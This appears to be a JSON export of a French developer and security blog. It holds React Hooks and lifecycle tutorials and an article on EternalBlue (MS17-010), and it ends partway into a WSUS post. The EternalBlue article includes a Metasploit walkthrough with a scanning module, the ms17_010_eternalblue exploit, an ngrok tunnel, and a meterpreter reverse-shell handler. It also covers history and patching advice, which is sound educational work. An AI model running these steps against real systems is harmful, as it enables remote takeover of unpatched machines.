[{"content":"","date":"7 August 2023","permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog"},{"content":"","date":"7 August 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"7 August 2023","permalink":"/dev-posts/","section":"Dev-posts","summary":"","title":"Dev-posts"},{"content":"","date":"7 August 2023","permalink":"/categories/d%C3%A9veloppement/","section":"Categories","summary":"","title":"Développement"},{"content":"","date":"7 August 2023","permalink":"/tags/front-end/","section":"Tags","summary":"","title":"Front-end"},{"content":"","date":"7 August 2023","permalink":"/tags/javascript/","section":"Tags","summary":"","title":"JavaScript"},{"content":"","date":"7 August 2023","permalink":"/","section":"l1d1nsec","summary":"","title":"l1d1nsec"},{"content":"","date":"7 August 2023","permalink":"/tags/react/","section":"Tags","summary":"","title":"React"},{"content":" Introduction aux Hooks React # Les Hooks sont une fonctionnalité introduite dans React 16.8 qui permet aux développeurs d\u0026rsquo;utiliser l\u0026rsquo;état et d\u0026rsquo;autres fonctionnalités de React sans avoir à écrire une classe. Avant les Hooks, la gestion de l\u0026rsquo;état et l\u0026rsquo;accès aux fonctionnalités du cycle de vie étaient confinés aux composants de classe, ce qui pouvait rendre le code plus lourd et moins réutilisable. Les Hooks offrent une manière plus élégante et fonctionnelle d\u0026rsquo;écrire des composants, favorisant une meilleure réutilisation du code, une plus grande lisibilité, et une meilleure séparation des préoccupations. Ils permettent aux développeurs d\u0026rsquo;extraire la logique de composant dans des fonctions réutilisables, rendant le code plus propre et plus modulaire.\nHooks classiques # Pour la présentation des hooks, chaque hook sera défini avec son utilité puis 1 ou 2 cas d\u0026rsquo;usages classiques et un squelette d\u0026rsquo;exemple pratique.\nuseState # Définition : Le Hook useState permet d\u0026rsquo;ajouter un état local à un composant fonctionnel.\nPourquoi c\u0026rsquo;est utile : Il permet une gestion de l\u0026rsquo;état dans un composant sans avoir besoin de convertir le composant en classe.\nCas d\u0026rsquo;usage :\nContrôler un formulaire. Afficher/Cacher un élément conditionnellement. Exemple pratique :\nconst [count, setCount] = useState(0); \u0026lt;button onClick={() =\u0026gt; setCount(count + 1)}\u0026gt;Incrémenter\u0026lt;/button\u0026gt; useEffect # Définition : Le Hook useEffect permet d\u0026rsquo;exécuter des effets secondaires dans les composants fonctionnels.\nPourquoi c\u0026rsquo;est utile : Il remplace les méthodes de cycle de vie componentDidMount, componentDidUpdate, et componentWillUnmount dans les composants de classe.\nCas d\u0026rsquo;usage :\nRécupération de données depuis une API. Ajouter/Retirer un écouteur d\u0026rsquo;événement. Exemple pratique :\nuseEffect(() =\u0026gt; { document.title = `Compteur ${count}`; }, [count]); // Dépendance sur la variable count useContext # Définition : Le Hook useContext permet d\u0026rsquo;accéder à la valeur actuelle du contexte sans avoir à envelopper le composant dans un Context.Consumer.\nPourquoi c\u0026rsquo;est utile : Simplifie l\u0026rsquo;accès aux valeurs du contexte dans un composant fonctionnel.\nCas d\u0026rsquo;usage :\nThématisation d\u0026rsquo;une application. Gestion globale de l\u0026rsquo;état. Exemple pratique :\nconst ThemeContext = React.createContext(\u0026#39;light\u0026#39;); const theme = useContext(ThemeContext); useReducer # Définition : Le Hook useReducer est similaire à useState mais permet de gérer une logique d\u0026rsquo;état plus complexe. Il utilise un réducteur pour gérer l\u0026rsquo;état du composant.\nPourquoi c\u0026rsquo;est utile : Idéal pour gérer l\u0026rsquo;état qui implique plusieurs valeurs interdépendantes.\nCas d\u0026rsquo;usage :\nGestion d\u0026rsquo;un formulaire avec plusieurs champs. Manipulation d\u0026rsquo;un état complexe dans une application. Exemple pratique :\nconst [state, dispatch] = useReducer(reducer, initialState); dispatch({ type: \u0026#39;INCREMENT\u0026#39; }); useCallback # Définition : Le Hook useCallback retourne une version mémoïsée d\u0026rsquo;une fonction callback.\nPourquoi c\u0026rsquo;est utile : Il aide à optimiser les performances en évitant la création de nouvelles instances de la fonction lors de chaque rendu.\nCas d\u0026rsquo;usage :\nPasser des callbacks à des composants enfants optimisés. Éviter les re-rendus inutiles. Exemple pratique :\nconst memoizedCallback = useCallback(() =\u0026gt; { // Logique de la fonction }, [dependencies]); useMemo # Définition : Le Hook useMemo retourne une valeur mémoïsée, calculée à l\u0026rsquo;aide d\u0026rsquo;une fonction.\nPourquoi c\u0026rsquo;est utile : Permet d\u0026rsquo;éviter des calculs coûteux lors de chaque rendu.\nCas d\u0026rsquo;usage :\nCalcul de valeurs dérivées complexes. Amélioration des performances en cas de calculs intensifs. Exemple pratique :\nconst memoizedValue = useMemo(() =\u0026gt; computeExpensiveValue(a, b), [a, b]); useRef # Définition : Le Hook useRef permet de garder une référence mutable qui persiste à travers les rendus.\nPourquoi c\u0026rsquo;est utile : Accéder aux éléments du DOM ou garder une valeur qui ne déclenche pas de rendu lorsqu\u0026rsquo;elle change.\nCas d\u0026rsquo;usage :\nFocus sur un champ de formulaire. Garder une trace d\u0026rsquo;une variable sans provoquer de rendu. Exemple pratique :\nconst inputRef = useRef(null); \u0026lt;input ref={inputRef} /\u0026gt; \u0026lt;button onClick={() =\u0026gt; inputRef.current.focus()}\u0026gt;Focus\u0026lt;/button\u0026gt; Conclusion # Les Hooks dans React ont révolutionné la façon dont nous écrivons et gérons les composants. Ils offrent une syntaxe plus claire, une meilleure réutilisation du code, et accèdent aux fonctionnalités avancées de React dans des composants fonctionnels.\nHooks moins connus # Ces hooks sont beaucoup moins utilités car ça permet de réaliser des optimisations qui peuvent mener à des anti-patterns, ou car ils correspondent à des utilisations très \u0026ldquo;niche\u0026rdquo; liée à de l\u0026rsquo;optimisation qui n\u0026rsquo;est que dans de rares cas nécessaire.\nExclusivement pour cette section, des explications plus détaillées seront rédigées pour expliquer les hooks dans le détail :\nuseImperativeHandle # Définition : Le Hook useImperativeHandle personnalise l\u0026rsquo;instance d\u0026rsquo;un composant exposée aux parents qui utilisent ref.\nUtilité : Ce Hook est spécifiquement conçu pour permettre à un composant parent d\u0026rsquo;interagir avec certaines méthodes d\u0026rsquo;un composant enfant. Il vous permet de personnaliser la valeur exposée à l\u0026rsquo;aide de la ref.\nPourquoi il est moins utilisé : Il s\u0026rsquo;écarte de l\u0026rsquo;approche fonctionnelle et déclarative typique de React, et peut donc rendre le code plus difficile à suivre. L\u0026rsquo;utilisation excessive peut conduire à des anti-modèles.\nCas d\u0026rsquo;usage :\nExposer des méthodes de contrôle pour un composant enfant. Cacher certaines implémentations internes d\u0026rsquo;un composant. Exemple pratique :\nfunction MyComponent(props, ref) { useImperativeHandle(ref, () =\u0026gt; ({ focus: () =\u0026gt; { // Logique de focus } })); } const MyComponentWithRef = forwardRef(MyComponent); useLayoutEffect # Définition : Le Hook useLayoutEffect a la même signature que useEffect, mais il s\u0026rsquo;exécute de manière synchrone après que toutes les modifications du DOM aient été effectuées.\nUtilité : Semblable à useEffect, ce Hook est utilisé pour effectuer des lectures ou des écritures synchrones sur le DOM. Il est exécuté avant que le navigateur n\u0026rsquo;ait eu la chance de \u0026ldquo;peindre\u0026rdquo;, permettant donc des transitions et des animations fluides.\nPourquoi il est moins utilisé : Son utilisation est spécifique aux situations où le timing de l\u0026rsquo;effet est crucial. Dans la plupart des cas, useEffect est suffisant, et l\u0026rsquo;utilisation incorrecte de useLayoutEffect peut causer des problèmes de performances.\nCas d\u0026rsquo;usage :\nMesurer la taille ou la position d\u0026rsquo;un élément du DOM après le rendu. Animer les transitions.\nExemple pratique :\nuseLayoutEffect(() =\u0026gt; { // Accéder aux valeurs du DOM ici }, [dependencies]); useDebugValue # Définition : Le Hook useDebugValue peut être utilisé pour afficher une étiquette pour des Hooks personnalisés dans React DevTools.\nUtilité : Ce Hook améliore le débogage en permettant d\u0026rsquo;afficher une étiquette dans React DevTools pour un Hook personnalisé. Il peut rendre le débogage plus clair et plus informatif.\nPourquoi il est moins utilisé : Son application est très spécifique à la création et au débogage de Hooks personnalisés. Pour de nombreux développeurs, le besoin de ce Hook peut être rare.\nCas d\u0026rsquo;usage :\nAfficher une valeur lisible lors du débogage. Fournir des informations supplémentaires sur un Hook personnalisé.\nExemple pratique :\nfunction useMyHook(value) { useDebugValue(value ? \u0026#39;Actif\u0026#39; : \u0026#39;Inactif\u0026#39;); // Logique du Hook } Point d\u0026rsquo;attention # Ces Hooks plus niches offrent des fonctionnalités puissantes mais spécifiques qui ne sont pas nécessaires dans la plupart des situations de développement quotidiennes. Leur utilisation cible des cas d\u0026rsquo;utilisation plus avancés ou spécialisés.\nL\u0026rsquo;utilisation de ces Hooks nécessite une compréhension plus profonde de leur fonctionnement et du moment où ils sont appropriés. Bien que moins communs, ils peuvent être extrêmement utiles dans les bonnes situations, et comprendre leur fonctionnement peut aider à résoudre certains problèmes complexes ou spécifiques dans une application React.\nGestion des Effets Secondaires # Définition # Dans une application React, vous serez souvent confronté à la nécessité de réaliser des opérations qui vont au-delà du rendu du composant, comme les requêtes réseau, les écouteurs d\u0026rsquo;événements, les souscriptions, et plus encore. Ces opérations sont connues sous le nom d\u0026rsquo;effets secondaires, et elles nécessitent une gestion soignée.\nUtilisation du Hook useEffect # Le Hook useEffect est un outil puissant dans React qui vous permet de gérer ces effets secondaires dans les composants fonctionnels. Il combine les fonctionnalités des méthodes componentDidMount, componentDidUpdate, et componentWillUnmount dans les composants de classe.\nExemple de requête réseau :\nuseEffect(() =\u0026gt; { const fetchData = async () =\u0026gt; { const response = await fetch(\u0026#39;https://api.example.com/data\u0026#39;); const data = await response.json(); // Mettre à jour l\u0026#39;état avec les données }; fetchData(); }, []); // Le tableau vide signifie que l\u0026#39;effet s\u0026#39;exécute une fois après le premier rendu Exemple d\u0026rsquo;écouteur d\u0026rsquo;événements :\nuseEffect(() =\u0026gt; { const handleResize = () =\u0026gt; { // Logique de gestion du redimensionnement }; window.addEventListener(\u0026#39;resize\u0026#39;, handleResize); // Retourner une fonction de nettoyage pour supprimer l\u0026#39;écouteur return () =\u0026gt; { window.removeEventListener(\u0026#39;resize\u0026#39;, handleResize); }; }, []); // Encore une fois, s\u0026#39;exécute une fois après le premier rendu Conclusion # La gestion des effets secondaires est un aspect crucial du développement en React. Le Hook useEffect offre une manière élégante et puissante de gérer ces effets secondaires, rendant votre code plus propre et plus maintenable.\nBonnes Pratiques et Anti-modèles # Bonnes Pratiques # Ne pas placer de Hooks à l\u0026rsquo;intérieur de boucles, conditions, ou fonctions imbriquées : Assurez-vous que les Hooks sont toujours appelés dans le même ordre.\nUtiliser plusieurs appels à useEffect pour séparer des logiques différentes : Cela rend votre code plus lisible et modulable.\nUtiliser la fonction de nettoyage dans useEffect : Pour éviter les fuites de mémoire, retournez une fonction de nettoyage pour supprimer les écouteurs, les souscriptions, etc.\nAnti-modèles # Omission de dépendances dans le tableau de dépendances : Si vous utilisez une valeur qui change dans l\u0026rsquo;effet, assurez-vous de l\u0026rsquo;inclure dans le tableau de dépendances de useEffect.\nUtilisation excessive de l\u0026rsquo;état global : Utiliser un état global pour tout peut rendre l\u0026rsquo;application plus difficile à maintenir. Utilisez l\u0026rsquo;état local lorsque c\u0026rsquo;est approprié.\nDépendance sur l\u0026rsquo;ordre d\u0026rsquo;exécution des Hooks : Ne dépendez pas de l\u0026rsquo;ordre d\u0026rsquo;exécution entre différents Hooks; ils doivent être indépendants.\n","date":"7 August 2023","permalink":"/dev-posts/react-hooks/","section":"Dev-posts","summary":"Des composants fonctionnels aux hooks moins connus, cet article décortique les capacités et les applications des Hooks dans React, permettant un code plus propre, modulable et optimisé.","title":"React Hooks: Introduction, Utilisation et Bonnes Pratiques"},{"content":"","date":"7 August 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":" Histoire de React # React est une bibliothèque JavaScript open-source créée par Facebook. Elle a été lancée en 2013 avec l\u0026rsquo;idée de construire des interfaces utilisateur réactives et efficaces. Le concept principal de React est la création de composants réutilisables qui gèrent leur propre état. Cela a révolutionné la façon dont les développeurs créent des applications web, en introduisant une manière plus modulaire et maintenable de construire des interfaces utilisateur.\nInnovation # React a marqué une innovation significative dans le développement front-end en introduisant le concept de composants réutilisables et en centralisant la gestion de l\u0026rsquo;état. Avant React, la gestion de l\u0026rsquo;état dynamique et l\u0026rsquo;interactivité dans les applications web étaient souvent complexes et dispersées. React a résolu ces problèmes en permettant aux développeurs de construire des interfaces utilisateur modulaires où chaque composant gère son propre état et sa logique. De plus, grâce à son algorithme de réconciliation virtuel, React est capable d\u0026rsquo;effectuer des mises à jour dans le DOM de manière très efficace. Ces innovations ont transformé la manière de développer des applications web, en rendant le processus plus structuré, maintenable, et performant.\nDifférence entre React.js, Vue.js et Angular # React # Nature : React est principalement une bibliothèque pour construire des interfaces utilisateur, et elle se concentre sur la vue dans le modèle MVC (Modèle-Vue-Contrôleur). Flexibilité : React offre plus de flexibilité dans le choix des autres bibliothèques et outils à utiliser avec elle. Vous pouvez choisir vos propres bibliothèques pour la gestion de l\u0026rsquo;état, le routage, etc. Composants : React utilise JSX, une syntaxe qui ressemble à HTML et qui est intégrée dans JavaScript, facilitant la création de composants.\nAngular # Nature : Angular est un cadre complet qui fournit non seulement des fonctionnalités pour la vue, mais aussi pour le modèle et le contrôleur. C\u0026rsquo;est une solution tout-en-un. Complexité : Angular a une courbe d\u0026rsquo;apprentissage plus raide en raison de sa complexité et de son ensemble complet de fonctionnalités. Langage : Angular utilise TypeScript, qui apporte des fonctionnalités de typage statique, augmentant la lisibilité et la robustesse du code.\nVue.js # Nature : Vue.js est un cadre progressif, ce qui signifie qu\u0026rsquo;il peut être adopté de manière incrémentielle. Vous pouvez l\u0026rsquo;utiliser pour des parties de votre projet ou pour une application complète. Simplicité : Vue.js est souvent loué pour sa simplicité et sa facilité d\u0026rsquo;apprentissage, en particulier pour les débutants. Flexibilité et Conception : Vue a un équilibre entre la flexibilité de React et les fonctionnalités d\u0026rsquo;Angular, avec une syntaxe simple et une séparation claire entre le modèle, la vue et la logique.\nLes principales différences avec React v16 # Avec la sortie de React v16 en septembre 2017, plusieurs changements majeurs ont été introduits. Le plus notable est le nouvel algorithme de réconciliation, nommé Fiber, qui a rendu le rendu des composants beaucoup plus efficace. React v16 a également apporté la prise en charge des fragments, la gestion des erreurs avec les limites d\u0026rsquo;erreur, et l\u0026rsquo;asynchronisme dans le rendu.\nClass components # Les composants de classe en React offrent une manière structurée de créer des composants ayant un état et un cycle de vie. Le cycle de vie est une série de phases que le composant traverse de sa création à sa destruction. Voici un aperçu plus détaillé :\nconstructor: Le constructeur est une méthode spéciale pour créer et initialiser un objet créé à partir d\u0026rsquo;une classe. En React, il est souvent utilisé pour initialiser l\u0026rsquo;état local et lier les gestionnaires d\u0026rsquo;événements. Par exemple: constructor(props) { super(props); this.state = { count: 0 }; this.handleClick = this.handleClick.bind(this); } componentDidMount: Cette méthode est appelée après que le composant a été inséré dans le DOM (Document Object Model), qui est la représentation structurée de votre document HTML. \u0026ldquo;Monter\u0026rdquo; un composant signifie que le composant est créé et inséré dans le DOM. Par exemple, vous pouvez démarrer une requête réseau ici. componentDidMount() { // Appel à une API ou autre logique } componentDidUpdate: Appelé après que le composant a été mis à jour dans le DOM. \u0026ldquo;Mettre à jour\u0026rdquo; signifie que quelque chose dans le composant a changé, comme l\u0026rsquo;état ou les props, et le rendu du composant est recalculé. componentDidUpdate(prevProps, prevState) { // Effectuer des opérations de mise à jour } componentWillUnmount: Appelé juste avant que le composant ne soit supprimé du DOM. C\u0026rsquo;est ici que vous effectuerez tout nettoyage nécessaire, comme l\u0026rsquo;annulation de requêtes réseau ou la suppression d\u0026rsquo;écouteurs d\u0026rsquo;événements. componentWillUnmount() { // Nettoyer les ressources } Component lifecycle diagramme Les composants fonctionnels: une meilleure voie # Les composants fonctionnels en React sont une manière plus simple et plus concise de créer des composants. Contrairement aux composants de classe, ils sont écrits comme de simples fonctions JavaScript, ce qui les rend plus lisibles et maintenables.\nAvec l\u0026rsquo;introduction des Hooks dans React v16.8, les composants fonctionnels peuvent maintenant accéder à des fonctionnalités autrefois réservées aux composants de classe, comme l\u0026rsquo;état et le cycle de vie.\nVoici un exemple d\u0026rsquo;un composant fonctionnel utilisant le Hook useState :\nimport React from \u0026#39;react\u0026#39;; function Counter() { const [count, setCount] = React.useState(0); return ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Le compteur est à : {count}\u0026lt;/p\u0026gt; \u0026lt;button onClick={() =\u0026gt; setCount(count + 1)}\u0026gt;Incrementer\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); } Avec cette façon de fonctionner react a ajouté de : Optimalité :\nSimplicité : Les composants fonctionnels sont plus légers et nécessitent moins de code que les composants de classe, ce qui peut améliorer la performance.\nRéutilisation du code : Avec les Hooks personnalisés, vous pouvez extraire la logique du composant dans des fonctions réutilisables, évitant ainsi la duplication du code.\nFacilite les tests :\nMoins d\u0026rsquo;Implémentation de Détails : Les composants fonctionnels encouragent une séparation plus claire entre la logique et la présentation, ce qui rend les tests plus faciles car vous pouvez vous concentrer sur le comportement plutôt que sur la manière dont il est implémenté. Compatibilité avec les Outils de Test : Les bibliothèques de test comme React Testing Library fonctionnent bien avec les composants fonctionnels, facilitant la rédaction de tests qui suivent les meilleures pratiques. Un article sur les tests automatiques sera posté par la suite pour traiter les différents types de tests et leur utilité.\nHooks et le cycle de vie d\u0026rsquo;un composant # Les Hooks permettent aux composants fonctionnels d\u0026rsquo;accéder à des fonctionnalités qui étaient auparavant réservées aux composants de classe. Voici comment ils se comparent au cycle de vie des composants de classe:\nuseState : Remplace this.state dans les composants de classe. useEffect : Peut être utilisé pour gérer les effets secondaires et remplace componentDidMount, componentDidUpdate, et componentWillUnmount. useContext : Permet d\u0026rsquo;accéder au contexte sans avoir à utiliser un Consumer. Les Hooks favorisent une meilleure réutilisation du code et une séparation des préoccupations, rendant votre code plus propre et plus facile à maintenir.\nBonus : Les Méthodes de Cycle de Vie Obsolètes # Avec l\u0026rsquo;évolution de React, certaines méthodes de cycle de vie sont devenues obsolètes et ont été remplacées par des alternatives plus modernes et plus efficaces. Comprendre ces changements est essentiel pour maintenir des applications performantes et à jour.\nMéthodes Dépréciées # Voici quelques-unes des méthodes de cycle de vie qui ont été dépréciées dans les versions récentes de React :\ncomponentWillMount : Utilisé avant que le composant ne soit monté dans le DOM. Remplacé par le constructeur dans les composants de classe et le Hook useEffect avec un tableau de dépendances vide dans les composants fonctionnels.\ncomponentWillReceiveProps : Appelé avant que le composant ne reçoive de nouvelles props. Remplacé par static getDerivedStateFromProps.\ncomponentWillUpdate : Appelé juste avant que le rendu ne se produise lors d\u0026rsquo;une mise à jour. Remplacé par componentDidUpdate.\nRaisons de la Dépréciation # Ces méthodes ont été dépréciées pour plusieurs raisons, notamment :\nAmélioration des Performances : Les nouvelles méthodes offrent une meilleure optimisation et un rendu plus efficace. Compatibilité avec les Futures Fonctionnalités : La dépréciation facilite l\u0026rsquo;introduction de fonctionnalités asynchrones et d\u0026rsquo;autres améliorations dans React. Lisibilité et Maintenance : Les nouvelles méthodes et Hooks favorisent un code plus propre et plus maintenable. ","date":"6 August 2023","permalink":"/dev-posts/react-components-lifecycle/","section":"Dev-posts","summary":"De l\u0026rsquo;introduction de React à la transformation avec la version 16, cet article explore l\u0026rsquo;évolution des composants de classe et fonctionnels, met en évidence les avantages des Hooks et démontre pourquoi React est devenu un choix incontournable dans le développement d\u0026rsquo;interfaces utilisateur.","title":"React: Composants, Cycle de Vie, et Évolution Modernes"},{"content":"","date":"4 August 2023","permalink":"/cyber-posts-vulnerabilities/","section":"Cyber-posts-Vulnerabilities","summary":"","title":"Cyber-posts-Vulnerabilities"},{"content":"","date":"4 August 2023","permalink":"/categories/cybers%C3%A9curit%C3%A9/","section":"Categories","summary":"","title":"Cybersécurité"},{"content":"","date":"4 August 2023","permalink":"/tags/eternalblue/","section":"Tags","summary":"","title":"EternalBlue"},{"content":" Introduction # EternalBlue est un exploit connu qui a été rendu tristement célèbre par son utilisation dans l\u0026rsquo;attaque du rançongiciel WannaCry en 2017. Cet exploit, présumé avoir été développé par la National Security Agency (NSA) des États-Unis, cible les versions de Microsoft Windows XP à Windows Server 2012 R2. Cet article explore l\u0026rsquo;histoire, le fonctionnement et les implications de l\u0026rsquo;exploit EternalBlue.\nHistorique # L\u0026rsquo;exploit EternalBlue a été publié pour la première fois par le groupe de hackers appelé The Shadow Brokers en avril 2017. Il faisait partie d\u0026rsquo;une collection plus large d\u0026rsquo;outils qui, selon les rumeurs, avaient été volés à l\u0026rsquo;unité Equation Group de la NSA. Quelques semaines après la divulgation de l\u0026rsquo;exploit, il a été utilisé dans l\u0026rsquo;attaque mondiale du rançongiciel WannaCry qui a infecté des centaines de milliers de systèmes dans plus de 150 pays.\nFonctionnement # EternalBlue exploite une vulnérabilité dans le protocole SMB (Server Message Block) de Microsoft, qui est utilisé pour le partage de fichiers et d\u0026rsquo;imprimantes sur un réseau local. Plus précisément, il cible le service Microsoft SMBv1.\nL\u0026rsquo;exploit permet à un attaquant de transmettre des commandes spécialement conçues à un système vulnérable, lui permettant d\u0026rsquo;exécuter du code arbitraire sur le système cible. Cela signifie qu\u0026rsquo;un attaquant peut prendre le contrôle total d\u0026rsquo;un système à distance, sans nécessiter d\u0026rsquo;interaction de l\u0026rsquo;utilisateur. EternalBlue exploite cette vulnérabilité en envoyant un paquet spécialement conçu à un port d\u0026rsquo;écoute SMB sur un système cible. Ce paquet est structuré de manière à déborder un tampon (Buffer Overflow) dans le pilote de serveur SMB de Windows, ce qui permet à l\u0026rsquo;attaquant d\u0026rsquo;injecter et d\u0026rsquo;exécuter son propre code sur le système cible. En d\u0026rsquo;autres termes, l\u0026rsquo;attaquant peut prendre le contrôle total d\u0026rsquo;un système à distance.\nImplications et conséquences # La menace posée par EternalBlue est grave en raison de sa capacité à se propager sur les réseaux, EternalBlue est particulièrement dangereux pour les environnements d\u0026rsquo;entreprise où de nombreux systèmes sont interconnectés.\nMalgré la disponibilité d\u0026rsquo;un correctif de sécurité de Microsoft (MS17-010) publié en mars 2017, de nombreux systèmes restent non patchés et donc vulnérables à EternalBlue. Cela est dû à une combinaison de facteurs, notamment le manque de sensibilisation à la sécurité, les contraintes de ressources et l\u0026rsquo;utilisation continue de systèmes d\u0026rsquo;exploitation obsolètes et non pris en charge.\nQuelques exemples d\u0026rsquo;attaques historiques basées sur l\u0026rsquo;EternalBlue :\nWannaCry : L\u0026rsquo;attaque de rançongiciel WannaCry a eu lieu en mai 2017, causant des dommages financiers estimés à 4 milliards de dollars. Les cybercriminels ont utilisé EternalBlue pour compromettre des ordinateurs vulnérables. Une fois qu\u0026rsquo;ils ont pris le contrôle de systèmes non patchés, ils ont installé WannaCry, qui a verrouillé les utilisateurs hors de leurs fichiers et même de leurs ordinateurs. Ceux qui souhaitaient récupérer l\u0026rsquo;accès étaient invités à payer une rançon de 300 dollars chacun en Bitcoin.\nNotPetya : L\u0026rsquo;attaque de rançongiciel NotPetya en juin 2017 a été encore plus dévastatrice que son prédécesseur WannaCry. Les dommages financiers estimés ont atteint 10 milliards de dollars, ce qui en fait l\u0026rsquo;attaque la plus destructrice utilisant EternalBlue à ce jour. Contrairement à WannaCry, la note de rançon de NotPetya ne promettait pas aux utilisateurs qu\u0026rsquo;ils récupéreraient l\u0026rsquo;accès à leurs fichiers.\nSednit, également connu sous les noms \u0026ldquo;APT28\u0026rdquo;, \u0026ldquo;Fancy Bear\u0026rdquo; et \u0026ldquo;Sofacy\u0026rdquo;, est une attaque ciblée sur les réseaux Wi-Fi appartenant à des hôtels à travers l\u0026rsquo;Europe en août 2017. Comme ses prédécesseurs, les cybercriminels ont utilisé EternalBlue pour atteindre leurs cibles.\nBad Rabbit : Le rançongiciel Bad Rabbit a également utilisé EternalBlue lors d\u0026rsquo;attaques en octobre 2017, amenant les chercheurs en cybersécurité à croire qu\u0026rsquo;il a été créé par le même groupe à l\u0026rsquo;origine de NotPetya. Les attaquants ont demandé aux victimes de payer 285 dollars chacun en Bitcoin en échange de leurs fichiers.\nSatan : EternalBlue a également été utilisé pour distribuer le rançongiciel Satan en novembre 2017, suite au succès des attaques WannaCry, NotPetya et Bad Rabbit. Les victimes ont été invitées à payer 0.3 Bitcoin chacun pour retrouver l\u0026rsquo;accès à leurs fichiers.\nWannaMine, un malware de minage de cryptomonnaie, a fait surface en septembre 2018. Comme le reste des malwares discutés dans cette section, il a utilisé EternalBlue pour infiltrer les systèmes cibles.\nNRSMiner : Comme WannaMine, NRSMiner utilise les ordinateurs des victimes pour miner des Monero. On pense qu\u0026rsquo;il a été redessiné pour utiliser EternalBlue afin d\u0026rsquo;infecter les systèmes. Le malware repensé a circulé en janvier 2019.\nIndexsinas est un ver SMB qui utilise EternalBlue pour infiltrer les systèmes cibles depuis juin 2021. Il a été utilisé pour implanter des mineurs de cryptomonnaie (malwares qui minent des cryptomonnaies sans la connaissance de l\u0026rsquo;utilisateur) dans les ordinateurs infectés.\nDécouverte # Découvrir le host # Plusieurs méthodes sont possibles pour découvrir l\u0026rsquo;OS même de la machine hôte qu\u0026rsquo;on pentest :\nvérifier le TTL pour les machines OS TTL Windows 95/98 32 *nix (Linux/Unix) 64 Windows 128 Solaris/AIX 254 En utilisant Nmap : nmap -O -PN \u0026lt;url\u0026gt; Machine vulnérable au MS17-010 # Pour découvrir si un host est vulnérrable à l\u0026rsquo;EternalBlue :\nNmap :nmap -A -sV --script vuln \u0026lt;IP_MACHINE\u0026gt;\nMetasploit :\nmsfconsole search eternalblue use auxiliary/scanner/smb/smb_ms17_010 options Exploitation # On peut utiliser Metasploit encore une fois, mais cette fois avec un script exploit.\nmsfconsole search eternalblue use exploit/windows/smb/ms17_010_eternalblue options Avant de commencer, on tunnelle le traffic via ngrok pour pas que le fw local de la machine bloque le flux entrant du reverse shell. Ainsi on va par exemple utiliser Ngrok avec ngrok tcp 4444\nNgrok tunnel lancé Il faut alors set LHOST, LPORT et RHOST et payload.\nset lhost \u0026lt;url_ngrok\u0026gt; set lport \u0026lt;port_ngrok\u0026gt; set rhost \u0026lt;ip_destination\u0026gt; set payload windows/x64/meterpreter/reverse_tcp Maintenant avec la configuration, le tunnel sera crée entre le serveur vulnérable à l\u0026rsquo;eternalblue et le serveur ngrok, il faudrait faire un multi handle pour que ngrok fasse le forward des inbound sur la machine locale.\nAinsi on va utiliser le script multi/handler de metasploit :\nuse multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 set lport 4444 set exitonsession false set ReverseListenerBindAddress 127.0.0.1 exploit -j -z Par la suite en réalisant un exploit sur la 1ère session msfconsole,\nIl suffit de vérifier les sessions et on trouve que sur le multi handler après relance qu\u0026rsquo;on a bien notre session :\nexploit -j -z sessions -i 1 Prévention et atténuation # La première et la plus importante mesure pour se protéger contre EternalBlue est de s\u0026rsquo;assurer que tous les systèmes sont à jour avec les derniers correctifs de sécurité. En particulier, les systèmes Windows devraient avoir le correctif MS17-010 appliqué.\nDe plus, les organisations devraient envisager de désactiver SMBv1 si cela est possible sans perturber les opérations. SMBv1 est un protocole obsolète et Microsoft recommande son remplacement par des versions plus récentes et plus sécurisées.\nUn problème pour toujours # Des chercheurs de la NSA ont réalisé des recherches depuis le patch de la vulnérabilité, et ont réalisé que malgrès le patch la vulnérabilité va encore rester d\u0026rsquo;actualité pour longtemps étant donné que non seulement les systèmes non patchés seront concernés mais aussi toute machine utilisant une version cracké de Windows.\nLa liste des 10 pays les plus encore touchés par la vulnérabilité en dehors de l\u0026rsquo;amérique du nord et l\u0026rsquo;europe sont :\nIndonesia Taiwan Vietnam Thailand Egypt Russia China Philippines India Turkey ","date":"4 August 2023","permalink":"/cyber-posts-vulnerabilities/eternalblue/","section":"Cyber-posts-Vulnerabilities","summary":"EternalBlue est un exploit connu qui cible les versions de Windows de Microsoft, exploitant une vulnérabilité dans le protocole SMB et permettant à un attaquant de prendre le contrôle total d\u0026rsquo;un système.","title":"EternalBlue ou MS17-010"},{"content":"","date":"4 August 2023","permalink":"/tags/exploit/","section":"Tags","summary":"","title":"Exploit"},{"content":"","date":"4 August 2023","permalink":"/tags/s%C3%A9curit%C3%A9/","section":"Tags","summary":"","title":"Sécurité"},{"content":"","date":"4 August 2023","permalink":"/tags/ssi/","section":"Tags","summary":"","title":"SSI"},{"content":"","date":"4 August 2023","permalink":"/tags/wannacry/","section":"Tags","summary":"","title":"WannaCry"},{"content":"","date":"3 August 2023","permalink":"/cyber-posts-general/","section":"Cyber-posts-Generals","summary":"","title":"Cyber-posts-Generals"},{"content":"","date":"3 August 2023","permalink":"/tags/organisationnel/","section":"Tags","summary":"","title":"Organisationnel"},{"content":"","date":"3 August 2023","permalink":"/categories/securit%C3%A9/","section":"Categories","summary":"","title":"Securité"},{"content":" Introduction # WSUS, ou Windows Server Update Services, est un service gratuit fourni par Microsoft qui permet aux administrateurs de gérer la distribution de mises à jour diffusées à travers Microsoft Update. Cet article vise à fournir une définition claire de WSUS, à expliquer son utilité, et à illustrer son rôle vital dans la cybersécurité à travers des références à des guides officiels.\nDéfinition de WSUS # WSUS est une fonctionnalité des systèmes d\u0026rsquo;exploitation Windows Server qui permet aux administrateurs système de gérer et de contrôler les mises à jour de Windows distribuées par Microsoft. Cela offre une plateforme centralisée pour la gestion des mises à jour au sein d\u0026rsquo;un réseau d\u0026rsquo;entreprise, permettant ainsi aux administrateurs de contrôler quelles mises à jour sont installées, quand elles sont installées et sur quels systèmes.\nUtilité de WSUS # Le principal avantage de WSUS est qu\u0026rsquo;il permet aux administrateurs de gérer efficacement les mises à jour sur de nombreux systèmes. Sans WSUS, les administrateurs système devraient individuellement mettre à jour chaque machine, un processus qui peut être à la fois chronophage et susceptible d\u0026rsquo;erreurs.\nDe plus, WSUS permet aux entreprises d\u0026rsquo;économiser de la bande passante. Plutôt que de permettre à chaque machine de télécharger des mises à jour directement 